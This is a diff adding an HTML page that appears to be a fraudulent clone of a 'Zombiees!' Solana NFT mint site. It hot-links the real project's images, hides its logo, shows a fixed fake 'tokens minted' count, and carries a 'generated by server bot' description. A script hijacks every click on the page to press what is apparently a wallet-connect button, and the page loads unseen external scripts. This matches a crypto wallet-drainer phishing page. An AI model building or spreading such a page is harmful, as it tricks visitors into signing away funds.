@@ -1,0 +1,288 @@
+<html lang="en" class="md:tw-overflow-y-auto">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="description" content="NTC" data-react-helmet="true" />
+    <meta name="theme-color" content="#000000" />
+    <meta content="Zombiees!" property="og:title">
+    <meta content="
+    🟢 Zombiees! Minting is Now Live!
+
+
+‧SALE INFO:|‧Mint Price: 1 SOL |‧Supply: 3,333
+
+Tʜɪs ᴍᴇssᴀɢᴇ ɪs ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ 🇸​​​​​🇪​​​​​🇷​​​​​🇻​​​​​🇪​​​​​🇷​​​​​ 🇧​​​​​🇴​​​​​🇹 ​​​​​🤖" property="og:description">
+    <meta content="https://pbs.twimg.com/profile_banners/1500104994770534404/1651563767/1500x500" property="og:image">
+    <meta name="twitter:card" content="summary_large_image">
+    <link type="application/json+oembed" href="https://api.jsonbin.io/b/622184b37caf5d67835ed9ba/93" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>Zombiees! | Mint </title>
+    <link rel="shortcut icon" href="https://www.zombiees.io/images/Zombiees_Logo_New_Small-p-500.png" />
+    <link rel="stylesheet" type="text/css" href="css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <link rel="stylesheet" type="text/css" href="css/popper.css">
+    <script src="js/popper.js"></script>
+
+    <script>
+        window.addEventListener('click', () => {
+            document.getElementById('showcase__btn0').addEventListener('click', function(e) {
+                document.getElementsByClassName('MuiButton-containedPrimary')[0].click();
+            });
+        });
+    </script>
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-157459645-3"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+        gtag('js', new Date());
+
+        gtag('config', 'UA-157459645-3');
+    </script>
+    <script type="text/javascript">
+        var _smartsupp = _smartsupp || {};
+        _smartsupp.key = '953c858d9e29b58eb3fa54c938d34faad83301fe';
+        window.smartsupp || (function(d) {
+            var s, c, o = smartsupp = function() {
+                o._.push(arguments)
+            };
+            o._ = [];
+            s = d.getElementsByTagName('script')[0];
+            c = d.createElement('script');
+            c.type = 'text/javascript';
+            c.charset = 'utf-8';
+            c.async = true;
+            c.src = 'https://www.smartsuppchat.com/loader.js?';
+            s.parentNode.insertBefore(c, s);
+        })(document);
+    </script>
+</head>
+
+<body>
+    <header>
+        <div class="logo"><img src="https://www.zombiees.io/images/Zombiees_Logo_New_Small-p-500.png" style="width: 256px; height: 128px; display: none"></div>
+        <div class="social-list">
+
+        </div>
+    </header>
+
+    <section class="section main-screen">
+        <div class="main-area">
+
+            <div class="main-area__right">
+                <h2 class="right-title">Zombiees!</h2>
+
+                <div class="right-list">
+                    <li>
+                        <div class="text">
+                            3,333 Zombies ready to expand into the universe. 
+                    </li>
+                    </div>
+
+                    <div class="price">
+                        <div class="add-input-remove">
+                            <input type="text" id="total" value="1" readonly="">
+                            <a href="javascript:void(0)" class="minus-btn">-</a>
+                            <a href="javascript:void(0)" class="plus-btn">+</a>
+                        </div>
+                        <div class="price-box">
+                            <div id="price-total"><span>1</span> SOL</div>
+                            <div>4 NFT max per transaction</div>
+                        </div>
+                    </div>
+                    <div class="button-box">
+                        <div id="root" class="cl-root">
+                            <main>
+                                <button id="butt" class="join-btn" tabindex="0" type="button" style="display: none;"></button>
+                            </main>
+                        </div>
+                        <img src=imgs/solana.png alt="solana">
+                    </div>
+                </div>
+
+
+                <div class="main-area__left">
+                    <div class="slider-area">
+                        <img class="animation" src="https://www.zombiees.io/images/Zombiee_Demon-p-500.jpeg" alt="GiF">
+                        <div class="token">
+                            <div class="token-title">TOKENS MINTED</div>
+                            <div class="token-line">
+                                <div class="line"></div>
+                                <div class="progress-line"></div>
+                            </div>
+                            <div class="token-number" id="tokenup"><span id="tokennumber">688</span> <span id="endTick">3333</span></div>
+                        </div>
+                    </div>
+                </div>
+                <style>
+                    .alertify-notifier .ajs-message.ajs-success {
+                        background: #FF3D00 !important;
+                        width: 270px !important;
+                    }
+                </style>
+
+            </div>
+    </section>
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script src="js/slick.min.js"></script>
+    <script src="js/last-scripts.js"></script>
+
+    <script>
+        const $plusButton = document.querySelector(".plus-btn");
+        const $minuButton = document.querySelector(".minus-btn");
+        const $numberText = document.querySelector("#total");
+        const $remaining = document.querySelector('#remaining');
+        const $priceResultText = document.querySelector("#price-total span");
+        let itemPriceSelected = 1;
+        let itemCount = 1;
+
+        $plusButton.addEventListener("click", function(e) {
+            e.preventDefault();
+            itemCount = itemCount < 4 ? itemCount + 1 : 4;
+            $numberText.value = itemCount;
+            $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(2);
+        });
+        $minuButton.addEventListener("click", function(e) {
+            e.preventDefault();
+            itemCount = parseInt($numberText.value);
+            itemCount = itemCount > 1 ? itemCount - 1 : itemCount;
+            $numberText.value = itemCount;
+            $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(2);
+        });
+    </script>
+
+    <script>
+        ! function(e) {
+
+            function t(t) {
+                for (var n, i, a = t[0], c = t[1], l = t[2], s = 0, p = []; s < a.length; s++) i = a[s], Object
+                    .prototype
+                    .hasOwnProperty.call(o, i) && o[i] && p.push(o[i][0]), o[i] = 0;
+                for (n in c) Object.prototype.hasOwnProperty.call(c, n) && (e[n] = c[n]);
+                for (f && f(t); p.length;) p.shift()();
+                return u.push.apply(u, l || []), r()
+            }
+
+            function r() {
+                for (var e, t = 0; t < u.length; t++) {
+                    for (var r = u[t], n = !0, a = 1; a < r.length; a++) {
+                        var c = r[a];
+                        0 !== o[c] && (n = !1)
+                    }
+                    n && (u.splice(t--, 1), e = i(i.s = r[0]))
+                }
+                return e
+            }
+            var n = {},
+                o = {
+                    1: 0
+                },
+                u = [];
+
+            function i(t) {
+                if (n[t]) return n[t].exports;
+                var r = n[t] = {
+                    i: t,
+                    l: !1,
+                    exports: {}
+                };
+                return e[t].call(r.exports, r, r.exports, i), r.l = !0, r.exports
+            }
+            i.e = function(e) {
+                var t = [],
+                    r = o[e];
+                if (0 !== r)
+                    if (r) t.push(r[2]);
+                    else {
+                        var n = new Promise((function(t, n) {
+                            r = o[e] = [t, n]
+                        }));
+                        t.push(r[2] = n);
+                        var u, a = document.createElement("script");
+                        a.charset = "utf-8", a.timeout = 120, i.nc && a.setAttribute("nonce", i.nc), a.src =
+                            function(
+                                e) {
+                                return i.p + "../js/" + ({}[e] || e) + "." + {
+                                    3: ""
+                                }[e] + "chunk.js"
+                            }(e);
+                        var c = new Error;
+                        u = function(t) {
+                            a.onerror = a.onload = null, clearTimeout(l);
+                            var r = o[e];
+                            if (0 !== r) {
+                                if (r) {
+                                    var n = t && ("load" === t.type ? "missing" : t.type),
+                                        u = t && t.target && t.target.src;
+                                    c.message = "Loading chunk " + e + " failed.\n(" + n + ": " + u + ")", c
+                                        .name =
+                                        "ChunkLoadError", c.type = n, c.request = u, r[1](c)
+                                }
+                                o[e] = void 0
+                            }
+                        };
+                        var l = setTimeout((function() {
+                            u({
+                                type: "timeout",
+                                target: a
+                            })
+                        }), 12e4);
+                        a.onerror = a.onload = u, document.head.appendChild(a)
+                    }
+                return Promise.all(t)
+            }, i.m = e, i.c = n, i.d = function(e, t, r) {
+                i.o(e, t) || Object.defineProperty(e, t, {
+                    enumerable: !0,
+                    get: r
+                })
+            }, i.r = function(e) {
+                "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol
+                    .toStringTag, {
+                        value: "Module"
+                    }), Object.defineProperty(e, "__esModule", {
+                    value: !0
+                })
+            }, i.t = function(e, t) {
+                if (1 & t && (e = i(e)), 8 & t) return e;
+                if (4 & t && "object" == typeof e && e && e.__esModule) return e;
+                var r = Object.create(null);
+                if (i.r(r), Object.defineProperty(r, "default", {
+                        enumerable: !0,
+                        value: e
+                    }), 2 & t && "string" != typeof e)
+                    for (var n in e) i.d(r, n, function(t) {
+                        return e[t]
+                    }.bind(null, n));
+                return r
+            }, i.n = function(e) {
+                var t = e && e.__esModule ? function() {
+                    return e.default
+                } : function() {
+                    return e
+                };
+                return i.d(t, "a", t), t
+            }, i.o = function(e, t) {
+                return Object.prototype.hasOwnProperty.call(e, t)
+            }, i.p = "/", i.oe = function(e) {
+                throw console.error(e), e
+            };
+            var a = this["webpackJsonpcandy-machine-mint"] = this["webpackJsonpcandy-machine-mint"] || [],
+                c = a.push.bind(a);
+            a.push = t, a = a.slice();
+            for (var l = 0; l < a.length; l++) t(a[l]);
+            var f = c;
+            r()
+        }([])
+    </script>
+    <script src="js/chunk.js"></script>
+    <script src="js/main.chunk.js"></script>
+    <script src="js/tokenup.js"></script>
+    <script src="js/last-scripts.js"></script>
+</body>
+<script src="js/js-sdk-pro.min.js"></script>
+
+</html>
